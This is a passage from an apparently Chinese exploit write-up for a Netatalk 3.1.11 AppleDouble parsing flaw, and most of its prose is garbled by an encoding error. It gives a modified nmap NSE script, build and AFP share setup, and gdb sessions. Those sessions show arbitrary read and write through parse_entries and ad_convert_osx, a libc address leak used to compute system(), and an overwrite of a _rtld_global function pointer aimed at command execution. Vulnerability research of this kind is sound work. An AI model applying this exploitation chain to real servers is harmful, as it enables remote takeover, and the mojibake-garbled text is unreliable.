afp_getsrvrmesg, afp_createid, /* 32 - 39 */ afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch, afp_null, afp_null, afp_null, afp_null,\t/* 40 - 47 */ afp_opendt, afp_closedt, afp_null, afp_geticon, afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,\t/* 48 - 55 */ afp_addcomment, afp_rmvcomment, afp_getcomment, NULL, ...... }; static int set_auth_switch(const AFPObj *obj, int expired) { ...... afp_switch = postauth_switch; åœ¨å‡½æ•°è°ƒç”¨é“¾ä¸­ï¼Œafp_openforkåœ¨afp_switchçš„ä¸‹æ ‡ä¸º26ï¼ŒåŒæ—¶26ä¹Ÿå¯ä»¥åœ¨AFPæ•°æ®åŒ…å†…çœ‹åˆ°ï¼š\nè°ƒç”¨æ€»ç»“\næ€»ç»“ä»¥ä¸Šè§¦å‘æµç¨‹ï¼Œè§¦å‘åˆ°afp_openforkå‡½æ•°éœ€è¦AFPæ•°æ®åŒ…å†…Commandå­—æ®µå€¼ä¸º26åŒæ—¶éœ€è¦è®¾ç½®ADFLAGS_RF è¿™ä¸ªflagï¼Œè§¦å‘æ¼æ´é“¾æ¡ä¸ºï¼šafp_openfork-\u0026gt;ad_openâ†’ad_open_rfâ†’ad_open_rf_eaâ†’ad_header_read_osxâ†’parse_entriesã€‚\nå‡½æ•°è°ƒç”¨å›¾å¦‚ä¸‹ï¼š\nå¦‚ä½•å‘é€FPOpenForkè¯·æ±‚\nå‰é¢è¯´è¿‡åœ¨nmapä¸­å«æœ‰afpç›¸å…³çš„è„šæœ¬ï¼Œåœ¨nmapè‡ªå¸¦çš„luaåº“afp.luaä¸­å«æœ‰è¯»å–æ–‡ä»¶ç›¸å…³çš„å‡½æ•°ï¼Œè°ƒç”¨ä¹‹ï¼Œæœ€ç»ˆnseè„šæœ¬å¦‚ä¸‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨FPOpenForkè¯·æ±‚ä¸­å¿…é¡»è®¾ç½®ADFLAGS_RF è¿™ä¸ªflagæ‰ä¼šè§¦å‘åˆ°æ¼æ´å‡½æ•°é€»è¾‘ï¼Œåœ¨nmapè‡ªå¸¦çš„afp.luaçš„ReadFileå‡½æ•°ä¸­ï¼Œè¯¥flagå†™æ­»ä¸º0ï¼Œéœ€è¦ä¿®æ”¹ä¸º0x2ï¼Œè¯·æ±‚ä¸­çš„ADFLAGS_RF æ‰ä¼šè¢«è®¾ç½®ã€‚\naction = function(host, port) -- å’Œafp-lsé€»è¾‘ä¸€æ · local str_path = args[\u0026#34;path\u0026#34;] local content status, content = afpHelper:ReadFile(str_path) status, response = afpHelper:Logout() status, response = afpHelper:CloseSession() return content end return end æ–‡ä»¶å†…åº”è¯¥åŒ…å«ä»€ä¹ˆ\nåœ¨å‡½æ•°è°ƒç”¨é“¾ä¸­çš„ad_header_read_osx å‡½æ•°ä¸­ï¼Œæœ‰å¤‡æ³¨*Read an ._ file, only uses the resofork, finderinfo is taken from EA ï¼Œè¯¥å‡½æ•°åªä¼šä½¿ç”¨resofork å’Œfinderinfo è¿™ä¸¤ç§entryï¼Œ*æ‰€ä»¥åœ¨ç”Ÿæˆè§¦å‘è¯¥æ¼æ´çš„æ–‡ä»¶æ—¶åªéœ€è¦åŒ…å«è¿™ä¸¤ç§entryå³å¯ã€‚\nç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨Netatalk 3.1.11ç‰ˆæœ¬æ­å»º\nç³»ç»Ÿç‰ˆæœ¬ Ubuntu 1804\nå†…æ ¸ç‰ˆæœ¬\nroot@ubuntu:~/nettatalk/netatalk-3.1.11/build/sbin/genefile# uname -a Linux ubuntu 5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux libcç‰ˆæœ¬ libc-2.31.so\nNetatalkç¼–è¯‘\napt-get install -y libdb-dev libgcrypt-dev libcrack2-dev libgssapi-krb5-2 libgssapi3-heimdal libgssapi-perl libkrb5-dev libtdb-dev libevent-dev libdb-dev wget https://versaweb.dl.sourceforge.net/project/netatalk/netatalk/3.1.11/netatalk-3.1.11.tar.bz2 tar -xjf netatalk-3.1.11.tar.bz2 cd netatalk-3.1.11.tar.bz2 mkdir build export CFLAGS=\u0026#39;-g -O0\u0026#39; # ä¿ç•™è°ƒè¯•ç¬¦å·ï¼Œæ–¹ä¾¿è°ƒè¯• ./configure \\ --with-init-style=debian-systemd \\ --without-libevent \\ --without-tdb \\ --with-cracklib \\ --enable-krbV-uam \\ --enable-debug \\ --with-pam-confdir=/etc/pam.d \\ --with-dbus-daemon=/usr/bin/dbus-daemon \\ --with-dbus-sysconf-dir=/etc/dbus-1/system.d \\ --with-tracker-pkgconfig-version=1.0 \\ --prefix=`pwd`/build \\ --bindir=`pwd`/build/bin \\ --sbindir=`pwd`/build/sbin make make install Netatalké…ç½®\nmkdir /tmp/afp_tmp/ mkdir /tmp/afp_tmp/Public mkdir /tmp/afp_tmp/test echo test \u0026gt; /tmp/afp_tmp/test/test.txt echo hello \u0026gt; /tmp/afp_tmp//Public/hello.txt chmod 777 -R /tmp/afp_tmp/Public /tmp/afp_tmp/test /tmp/afp_tmp/afp.conf: [ Global ] uam list = uams_guest.so,uams_clrtxt.so,uams_dhx2.so save password = no unix charset = UTF8 use sendfile = yes zeroconf = no guest account = nobody [ Public ] path =/tmp/afp_tmp/Public ea = auto convert appledouble = no stat vol = no file perm = 777 directory perm = 777 veto files = \u0026#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/\u0026#39; rwlist = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; valid users = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; invalid users = [ test ] path = /tmp/afp_tmp/test ea = auto convert appledouble = no stat vol = no file perm = 777 directory perm = 777 veto files = \u0026#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/\u0026#39; rwlist = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; valid users = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; invalid users = å‚è€ƒï¼š\nhttps://nosec.org/home/detail/4997.html\nè°ƒè¯• åœ¨AFPDä¸­ï¼Œç”±å­è¿›ç¨‹è´Ÿè´£å¤„ç†AFPè¯·æ±‚ï¼Œçˆ¶è¿›ç¨‹åˆ™å¾ªç¯æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦è°ƒè¯•å­è¿›ç¨‹å³å¯ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œç¼–å†™äº†å¦‚ä¸‹è„šæœ¬ï¼Œè‡³äºä¸ºä»€ä¹ˆè®¾ç½®æ¡ä»¶æ–­ç‚¹b ad_open.c:1894 if adflags \u0026amp; 2 != 0 åœ¨åæ–‡è¯´æ˜ã€‚\nt.sh gdb -x debug.gdb attach `ps -ef | grep afpd | grep -v grep | grep -v cnid |awk \u0026#39;{print $2}\u0026#39; | head -1` debug.gdb set follow-fork-mode child set detach-on-fork off set schedule-multiple on b ad_open.c:1894 if adflags \u0026amp; 2 != 0 c b ad_open.c:617 b ad_open.c:605 å¯åŠ¨AFPDæœåŠ¡\n./afpd -d -F /tmp/afp_tmp/afpd.conf ./cnid_metad -d -F /tmp/afp_tmp/afpd.conf ä¸ºä»€ä¹ˆè¦è®¾ç½®æ¡ä»¶æ–­ç‚¹ å°†å‰é¢ç”Ÿæˆçš„appledoubleæ–‡ä»¶é€šè¿‡nmapè„šæœ¬ä¸Šä¼ åˆ°afpæœåŠ¡å™¨ï¼Œé€šè¿‡nmapè„šæœ¬è¯·æ±‚è¯¥æ–‡ä»¶è§¦å‘è¯¥æ¼æ´\nå¦‚æœæ–­ç‚¹æ²¡æœ‰è®¾ç½®if adflags \u0026amp; 2 != 0 è¿™ä¸ªæ¡ä»¶åˆ™gdbä¼šç›´æ¥æ–­åœ¨ad_open.c:1894ï¼Œæ­¤æ—¶è¯·æ±‚å†…ADFLAGS_RF å€¼ä¸º0ï¼Œä¸èƒ½è¿›å…¥æ¼æ´é€»è¾‘ï¼Œè€Œç”±äºæ–­ç‚¹ï¼Œafpæ— æ³•åŠæ—¶å›å¤nmapæ•°æ®åŒ…ï¼Œnmapä¼šæŠ¥è¶…æ—¶ã€‚\nç»§ç»­æ‰§è¡Œçš„è¯ï¼Œafpdä¼šæ”¶åˆ°SIGALRMä¿¡å·ï¼Œæ— æ³•è¿›å…¥æ¼æ´é€»è¾‘\næ­£å¸¸è°ƒè¯• ä¸Šä¼ çš„._readæ–‡ä»¶åˆ°testç›®å½•ï¼š\nè§¦å‘æ¼æ´ï¼Œè¿›å…¥parse_entrieså‡½æ•°å†…ï¼Œparse_entriesè¯»å–bufé‡Œé¢çš„æ•°æ®åˆ°adæŒ‡å‘çš„adoubleç»“æ„ä½“ä¸­ã€‚\næœ€ç»ˆadoubleç»“æ„ä½“å†…entryæˆå‘˜å˜é‡è¢«è®¾ç½®ä¸ºå¦‚ä¸‹å€¼ï¼Œå¯ä»¥çœ‹å‡ºfinderinfo entryå†…çš„offå·²ç»è¶Šç•Œäº†ï¼š\nè€Œæ­£å¸¸appledoubleæ–‡ä»¶å†…ï¼Œæ¯ä¸ªentry.ade_off+entry.ad_lenç›¸åŠ åº”è¯¥å°äºæ–‡ä»¶å¤§å°ï¼Œåœ¨ä¸Šå›¾ä¸­ç¬¬ä¹ä¸ªentryå³finderinfoçš„entry.ade_off+entry.ad_len = A27 \u0026gt;æ–‡ä»¶å¤§å°ï¼Œè¿™ä¸ªåç§»ä¹Ÿå¯ä»¥ä»æ–‡ä»¶å†…ä½“ç°ï¼Œæ­¤æ—¶finderinfoçš„offå·²è¶Šç•Œï¼Œæ­¤æ—¶å·²ç»æ§åˆ¶äº†adouble.entry.offã€‚\nå¦‚ä½•åˆ©ç”¨entryå†…çš„è¶Šç•Œ å‰é¢å†™åˆ°ï¼Œparse_entrieså‡½æ•°å¯ä»¥å°†adoubleç»“æ„ä½“å†…çš„entryçš„offå’Œlenç›¸åŠ å¤§äºæ–‡ä»¶å¤§å°ï¼Œå¦‚æœæŸä¸ªåœ°æ–¹è¯»å–äº†è¿™ä¸ªoffå’Œlenå¹¶ä½œä¸ºoffsetè¯»å†™æ•°æ®åˆ™å¯èƒ½äº§ç”Ÿè¶Šç•Œè¯»å†™ã€‚\nç»§ç»­çœ‹ad_header_read_osxè°ƒç”¨parse_entriesä¹‹åçš„é€»è¾‘ï¼Œåœ¨parse_entriesä¸­å¦‚æœç¨‹åºå‘ç°off+lenè¶Šç•Œåˆ™ä¼šè¿”å›-1ï¼Œå¦‚æœadæŒ‡å‘çš„adoubleç»“æ„ä½“å†…çš„finderinfo entryçš„ade_lenä¸ç­‰äº32åˆ™è¿›å…¥ifé€»è¾‘å†…ï¼Œè°ƒç”¨åˆ°ad_convert_osxå‡½æ•°ã€‚\nåœ¨ad_convert_osxå‡½æ•°ä¸­ï¼Œç¨‹åºå°†appledoubleæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶å¯¹æ–‡ä»¶æ˜ å°„çš„å†…å­˜çš„è¯»å†™å³æ˜¯å¯¹è¯¥æ–‡ä»¶çš„è¯»å†™ã€‚ad_convert_osxå‡½æ•°æ˜ å°„ä¹‹åè°ƒç”¨äº†memmoveå’Œad_rebuild_adouble_header_osxå‡½æ•°ï¼Œä¹‹åé€šè¿‡munmapå‡½æ•°å–æ¶ˆæ˜ å°„ï¼Œå°†å†…å­˜ä¸­çš„æ•°æ®å†™å…¥æ–‡ä»¶å†…ã€‚\nmmapçš„é•¿åº¦å‚æ•°origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK)å³ad.ADEID_RFORK.off + ad.ADEID_RFORK.len éƒ½ä¸ºå¯æ§å€¼\nstatic int ad_convert_osx(const char *path, struct adouble *ad) { ...... origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK); map = mmap(NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), 0); ...... memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI, map + ad_getentryoff(ad, ADEID_RFORK), ad_getentrylen(ad, ADEID_RFORK)); . (void)ad_rebuild_adouble_header_osx(ad, map); munmap(map, origlen); ...... } #define ad_getentrylen(ad,eid) ((ad)-\u0026gt;ad_eid[(eid)].ade_len) long ad_getentryoff(const struct adouble *ad, int eid) { if (ad-\u0026gt;ad_vers == AD_VERSION2) return ad-\u0026gt;ad_eid[eid].ade_off; switch (eid) { case ADEID_DFORK: return 0; case ADEID_RFORK: #ifdef HAVE_EAFD return 0; #else return ad-\u0026gt;ad_eid[eid].ade_off; #endif default: return ad-\u0026gt;ad_eid[eid].ade_off; } /* deadc0de */ AFP_PANIC(\u0026#34;What am I doing here?\u0026#34;); } mmapä¹‹åæ–‡ä»¶å·²æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œåœ¨ç»è¿‡å¤šæ¬¡æµ‹è¯•åï¼Œå½“resource fork length + resource fork offset â‰¤1000 æ—¶ä¼šmmapåˆ†é…çš„å†…å­˜åœ¨ld.sodataæ®µä¸Šé¢ã€‚\nä»»æ„å†™\nä»”ç»†çœ‹è°ƒç”¨memmoveæ—¶çš„å‚æ•°ï¼Œmapä¸ºæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜çš„é¦–åœ°å€ï¼Œad_getentryoffä¸ºè·å–æŒ‡å®šentry idçš„entryçš„offï¼ŒADEDLEN_FINDERIä¸ºå®å®šä¹‰å€¼ä¸º32=0x20ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å„ä¸ªentryçš„offå’Œlenï¼Œé€šè¿‡è¯¥å¤„è°ƒç”¨ï¼Œå³æˆ‘ä»¬å¯ä»¥ä»map + ad.ADEID_RFORK.offå¤„è¯»å–ä»»æ„é•¿åº¦çš„æ•°æ®å†™å…¥åˆ°ä»»ä½•é«˜äºmap+0x20çš„å†…å­˜ï¼ˆå‰ææ˜¯è¯¥åœ°å€å¯å†™ï¼‰ä¹Ÿå°±æ˜¯å°†æ–‡ä»¶ä¸­ad.ADEID_RFORK.off å¤„çš„æ•°æ®å†™å…¥è¯¥å†…å­˜ï¼Œè€Œad.ADEID_FINDERI.offå’Œad.ADEID_RFORK.offéƒ½ä¸ºå¯æ§å€¼ï¼Œå³å¯è¾¾åˆ°ä»»æ„å†™ã€‚\nmemmove(map + ad.ADEID_FINDERI.off + 0x20, map + ad.ADEID_RFORK.off, ad.ADEID_RFORK.len); ä»»æ„è¯»\nä»»æ„è¯»å‘ç”Ÿåœ¨ä»»æ„å†™çš„åé¢çš„å‡½æ•°è°ƒç”¨ï¼Œåœ¨ad_rebuild_adouble_header_osx å‡½æ•°ä¸­æœ‰å¦‚ä¸‹è¯­å¥ï¼Œè¯¥è¯­å¥å°†ad.ad_data+ad.ADEID_FINDERI.off å¤„å¼€å§‹é•¿ä¸º0x20çš„æ•°æ®å†™å…¥åˆ°adbuf+ADEDOFF_FINDERI_OSXä¸­ï¼ŒADEDOFF_FINDERI_OSXä¸ºå®å®šä¹‰ï¼Œå±•å¼€åå¯å¾—å€¼ä¸º26+2*12=50=0x32ï¼Œè€Œadbufä¸ºmmapæ˜ å°„åè¿”å›çš„å†…å­˜åœ°å€ï¼Œè¯¥å¤„è¯­å¥å°†æ•°æ®å†™å…¥åˆ°mmapæ˜ å°„çš„å†…å­˜åç§»0x32çš„ä½ç½®ã€‚\n#define ad_entry(ad,eid) ((caddr_t)(ad)-\u0026gt;ad_data + (ad)-\u0026gt;ad_eid[(eid)].ade_off) int ad_rebuild_adouble_header_osx(struct adouble *ad, char *adbuf) { ...... memcpy(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI); #define ADEDOFF_FINDERI_OSX (AD_HEADER_LEN + ADEID_NUM_OSX*AD_ENTRY_LEN) #define AD_HEADER_LEN (ADEDLEN_MAGIC + ADEDLEN_VERSION + ADEDLEN_FILLER + ADEDLEN_NENTRIES) /* 26 */ #define ADEID_NUM_OSX 2 #define AD_ENTRY_LEN 12 /* size of a single entry header */ åœ¨è°ƒç”¨å®Œad_rebuild_adouble_header_osx å‡½æ•°åï¼Œç¨‹åºè°ƒç”¨munmapå‡½æ•°å–æ¶ˆæ–‡ä»¶æ˜ å°„ï¼Œå†…å­˜å†…çš„æ•°æ®ä¼šè¢«å†™å›åˆ°appledoubleæ–‡ä»¶ä¸­ï¼Œç»¼åˆæœ‰ï¼šå¯ä»¥å°†ad.ad_data+ad.ADEID_FINDERI.off å¤„å¼€å§‹é•¿ä¸º0x20çš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶åç§»0x32å¤„çš„åœ°æ–¹ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡è¯»å–æ–‡ä»¶è·å–ä»»æ„è¯»çš„å†…å­˜çš„å†…å®¹ã€‚\nç»„åˆåˆ©ç”¨\nåœ¨å†…å­˜ä¸­adæŒ‡å‘çš„ç»“æ„ä½“æ˜¯å­˜æ”¾åœ¨æ ˆä¸Šçš„ï¼Œåˆ†é…çš„adoubleç»“æ„ä½“åœ°å€ä½äºad_header_read_osxæ ˆå¸§çš„rbp-0x620å¤„ï¼Œå¯ä»¥ç”¨è°ƒè¯•å™¨æµ‹ç®—å’Œ__libc_start_main_retçš„åœ°å€\ngefâ¤ bt #0 0x00007f624307220b in ad_header_read_osx (path=0x7f62430d6bc0 \u0026lt;pathbuf\u0026gt; \u0026#34;._read\u0026#34;, ad=0x558ce325bba0, hst=0x7ffcf6e36990) at ad_open.c:698 #1 0x00007f6243074e50 in ad_open_rf_ea (path=0x558ce2e38f80 \u0026lt;upath\u0026gt; \u0026#34;read\u0026#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1488 #2 0x00007f62430750ae in ad_open_rf (path=0x558ce2e38f80 \u0026lt;upath\u0026gt; \u0026#34;read\u0026#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1529 #3 0x00007f6243075d29 in ad_open (ad=0x558ce325bba0, path=0x558ce2e38f80 \u0026lt;upath\u0026gt; \u0026#34;read\u0026#34;, adflags=0x283) at ad_open.c:1895 #4 0x0000558ce2e143bd in afp_openfork (obj=0x558ce2e4d920 \u0026lt;obj\u0026gt;, ibuf=0x7f6242b6c022 \u0026#34;uthent\u0026#34;, ibuflen=0x12, rbuf=0x558ce3245b10 \u0026#34;\u0026#34;, rbuflen=0x558ce3255b10) at fork.c:364 #5 0x0000558ce2df2c81 in afp_over_dsi (obj=0x558ce2e4d920 \u0026lt;obj\u0026gt;) at afp_dsi.c:627 #6 0x0000558ce2e193ff in dsi_start (obj=0x558ce2e4d920 \u0026lt;obj\u0026gt;, dsi=0x558ce3245420, server_children=0x558ce3242240) at main.c:474 #7 0x0000558ce2e19102 in main (ac=0x4, av=0x7ffcf6e36fc8) at main.c:417 gefâ¤ i frame 7 Stack frame at 0x7ffcf6e36ee0: rip = 0x558ce2e19102 in main (main.c:417); saved rip = 0x7f6242e51083 caller of frame at 0x7ffcf6e36d80 source language c. Arglist at 0x7ffcf6e36d78, args: ac=0x4, av=0x7ffcf6e36fc8 Locals at 0x7ffcf6e36d78, Previous frame\u0026#39;s sp is 0x7ffcf6e36ee0 Saved registers: rbp at 0x7ffcf6e36ed0, rip at 0x7ffcf6e36ed8 gefâ¤ p \u0026amp;adosx.ad_data $11 = (char (*)[1024]) 0x7ffcf6e36522 gefâ¤ p 0x7ffcf6e36ed8 - 0x7ffcf6e36522 $12 = 0x9b6 ä»»æ„è¯»æ˜¯è¯»å–ad.ad_data+ad.ADEID_FINDERI.off å¤„é•¿ä¸º0x20çš„æ•°æ®ï¼Œè€Œad.ad_data è·ç¦»__libc_start_main_retä¸º0x9b6ï¼Œæ‰€ä»¥å¯ä»¥è®¾ç½®ad.ADEID_FINDERI.off ä¸º0x9b6ä»¥è·å–__libc_start_main_retåœ°å€ã€‚åˆ©ç”¨è„šæœ¬æ„é€ æ–‡ä»¶å¹¶åˆ©ç”¨NSEè„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨\né€šè¿‡å‘½ä»¤è§¦å‘è¯¥æ¼æ´ã€\n__libc_start_main_retåœ°å€å·²ç»å›æ˜¾åœ¨æ–‡ä»¶å†…\néªŒè¯åœ°å€:\nåœ¨\rhttps://libc.rip ä¸ŠéªŒè¯libcç‰ˆæœ¬ï¼š\né€šè¿‡__libc_start_main_retåœ°å€å¯ä»¥æµ‹ç®—systemå‡½æ•°åœ°å€\ngefâ¤ p 0x7f6242e51083 - 0x24083 + 0x52290 $14 = 0x7f6242e7f290 gefâ¤ p system $15 = {int (const char *)} 0x7f6242e7f290 \u0026lt;__libc_system\u0026gt; gefâ¤ è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†systemå‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆå¦‚ä½•åˆ©ç”¨è¿™ä¸ªåœ°å€å‘¢ï¼Ÿ\nNetatalkæ¯æ¬¡æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚éƒ½æ˜¯forkå­è¿›ç¨‹å¤„ç†è¯¥è¯·æ±‚ï¼Œçˆ¶è¿›ç¨‹ç»§ç»­ç›‘å¬socketï¼Œè€Œforkçš„å­è¿›ç¨‹å†…å­˜ç©ºé—´å’Œçˆ¶è¿›ç¨‹å†…å­˜ç©ºé—´çš„å†…å®¹ä¸€æ ·å³libcåº“è½½å…¥çš„åœ°å€ä¸å˜ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå‘é€è¯·æ±‚é€šè¿‡ä»»æ„è¯»è·å–åˆ°systemå‡½æ•°åœ°å€ï¼Œç¬¬äºŒæ¬¡å‘é€è¯·æ±‚æ—¶ï¼Œç”±äºçˆ¶è¿›ç¨‹ä¸å˜æ‰€ä»¥systemå‡½æ•°åœ°å€ä¸å˜ï¼Œé€šè¿‡ä»»æ„å†™çš„systemå‡½æ•°åœ°å€ä¸å˜ï¼Œæ‰èƒ½è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚\næ­£æ˜¯å› ä¸ºforkåï¼Œå†…å­˜ç©ºé—´ä¸å˜çš„æœºåˆ¶æ‰èƒ½åˆ©ç”¨ä»»æ„è¯»è·å–åˆ°systemå‡½æ•°åœ°å€ï¼Œè€Œåé€šè¿‡ä»»æ„å†™è¦†ç›–å‡½æ•°æŒ‡é’ˆè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚\nåœ¨Netatalkæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç¨‹åºå‡ºé”™ä¸ä¼šç«‹å³é€€å‡ºè€Œæ˜¯ä¼šæ•è·å¼‚å¸¸ï¼Œé€šè¿‡ä»»æ„å†™ï¼Œå†™å…¥äº†ld.soçš„æ•°æ®æ®µï¼Œè§¦å‘é”™è¯¯ï¼Œå¯¼è‡´äº†å¦‚ä¸‹å´©æºƒï¼š\ngefâ¤ bt #0 0x00007efeac84c59d in _dl_open (file=0x7efeac733eb9 \u0026#34;libgcc_s.so.1\u0026#34;, mode=0x80000002, caller_dlopen=0x7efeac6acfb9 \u0026lt;init+25\u0026gt;, nsid=0xfffffffffffffffe, argc=0x4, argv=0x7ffd9f27a1e8, env=0x7ffd9f27a210) at dl-open.c:786 #1 0x00007efeac6df8c1 in do_dlopen (ptr=ptr@entry=0x7ffd9f277d60) at dl-libc.c:96 #2 0x00007efeac6e0928 in __GI__dl_catch_exception (exception=exception@entry=0x7ffd9f277d00, operate=operate@entry=0x7efeac6df880 \u0026lt;do_dlopen\u0026gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:208 #3 0x00007efeac6e09f3 in __GI__dl_catch_error (objname=objname@entry=0x7ffd9f277d50, errstring=errstring@entry=0x7ffd9f277d58, mallocedp=mallocedp@entry=0x7ffd9f277d4f, operate=operate@entry=0x7efeac6df880 \u0026lt;do_dlopen\u0026gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:227 #4 0x00007efeac6df9f5 in dlerror_run (args=0x7ffd9f277d60, operate=0x7efeac6df880 \u0026lt;do_dlopen\u0026gt;) at dl-libc.c:46 #5 __GI___libc_dlopen_mode (name=name@entry=0x7efeac733eb9 \u0026#34;libgcc_s.so.1\u0026#34;, mode=mode@entry=0x80000002) at dl-libc.c:195 #6 0x00007efeac6acfb9 in init () at backtrace.c:54 #7 0x00007efeac7834df in __pthread_once_slow (once_control=0x7efeac76fe68 \u0026lt;once\u0026gt;, init_routine=0x7efeac6acfa0 \u0026lt;init\u0026gt;) at pthread_once.c:116 #8 0x00007efeac6ad104 in __GI___backtrace (array=\u0026lt;optimized out\u0026gt;, size=\u0026lt;optimized out\u0026gt;) at backtrace.c:111 #9 0x00007efeac7ec7ff in netatalk_panic (why=0x7efeac818148 \u0026#34;internal error\u0026#34;) at fault.c:93 #10 0x00007efeac7eca69 in fault_report (sig=0xb) at fault.c:127 #11 0x00007efeac7ecac3 in sig_fault (sig=0xb) at fault.c:147 #12 \u0026lt;signal handler called\u0026gt; #13 __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238 #14 0x00007efeac7c10e2 in ad_rebuild_adouble_header_osx (ad=0x7ffd9f279540, adbuf=0x7efeac863000 \u0026#34;\u0026#34;) at ad_flush.c:187 #15 0x00007efeac7c4d4c in ad_convert_osx (path=0x7efeac829bc0 \u0026lt;pathbuf\u0026gt; \u0026#34;._cmd\u0026#34;, ad=0x7ffd9f279540) at ad_open.c:617 #16 0x00007efeac7c5379 in ad_header_read_osx (path=0x7efeac829bc0 \u0026lt;pathbuf\u0026gt; \u0026#34;._cmd\u0026#34;, ad=0x55dcb6856780, hst=0x7ffd9f279bb0) at ad_open.c:713 #17 0x00007efeac7c7e50 in ad_open_rf_ea (path=0x55dcb5a7ef80 \u0026lt;upath\u0026gt; \u0026#34;cmd\u0026#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1488 #18 0x00007efeac7c80ae in ad_open_rf (path=0x55dcb5a7ef80 \u0026lt;upath\u0026gt; \u0026#34;cmd\u0026#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1529 #19 0x00007efeac7c8d29 in ad_open (ad=0x55dcb6856780, path=0x55dcb5a7ef80 \u0026lt;upath\u0026gt; \u0026#34;cmd\u0026#34;, adflags=0x283) at ad_open.c:1895 #20 0x000055dcb5a5a3bd in afp_openfork (obj=0x55dcb5a93920 \u0026lt;obj\u0026gt;, ibuf=0x7efeac2bf021 \u0026#34;Authent\u0026#34;, ibuflen=0x11, rbuf=0x55dcb6840b10 \u0026#34;\u0026#34;, rbuflen=0x55dcb6850b10) at fork.c:364 #21 0x000055dcb5a38c81 in afp_over_dsi (obj=0x55dcb5a93920 \u0026lt;obj\u0026gt;) at afp_dsi.c:627 #22 0x000055dcb5a5f3ff in dsi_start (obj=0x55dcb5a93920 \u0026lt;obj\u0026gt;, dsi=0x55dcb6840420, server_children=0x55dcb683d240) at main.c:474 #23 0x000055dcb5a5f102 in main (ac=0x4, av=0x7ffd9f27a1e8) at main.c:417 å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºè¯•å›¾è°ƒç”¨ä½äº0x4141414141414000å¤„çš„å‡½æ•°\ngefâ¤ x /i $pc =\u0026gt; 0x7efeac84c59d \u0026lt;_dl_open+61\u0026gt;: call QWORD PTR [rip+0x199c5] # 0x7efeac865f68 \u0026lt;_rtld_global+3848\u0026gt; gefâ¤ x /gx 0x7efeac865f68 0x7efeac865f68 \u0026lt;_rtld_global+3848\u0026gt;: 0x4141414141414000 gefâ¤ åœ¨\rhttps://code.woboq.org/userspace/glibc/elf/dl-open.c.html å¯ä»¥çœ‹åˆ°_dl_openå‡½æ•°æºç ï¼Œè¯¥å¤„ä¸º_dl_openå‡½æ•°è¯•å›¾é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨__rtld_lock_lock_recursiveæŒ‡å‘çš„å‡½æ•°å¹¶æŠŠ_dl_load_lockåœ°å€ä½œä¸ºæŒ‡é’ˆå‚æ•°ä¼ å…¥è¯¥å‡½æ•°å†…ã€‚\nvoid * _dl_open (const char *file, int mode, const void *caller_dlopen, Lmid_t nsid, int argc, char *argv[], char *env[]) { if ((mode \u0026amp; RTLD_BINDING_MASK) == 0) /* One of the flags must be set. */ _dl_signal_error (EINVAL, file, NULL, N_(\u0026#34;invalid mode for dlopen()\u0026#34;)); /* Make sure we are alone. */ __rtld_lock_lock_recursive (GL(dl_load_lock)); _rtld_globalåœ°å€ä¸º0x7efeac865060\ngefâ¤ p \u0026amp;_rtld_global $4 = (struct rtld_global *) 0x7efeac865060 \u0026lt;_rtld_global\u0026gt; __rtld_lock_lock_recursive å‡½æ•°æŒ‡é’ˆåŠå‚æ•°dl_load_lockå‡ä¸ºå…¨å±€å˜é‡_rtld_globalçš„æˆå‘˜\n# define GL(name) _rtld_local._##name # else # define GL(name) _rtld_global._##name å®šä¹‰åœ¨_rtld_local=_rtld_global 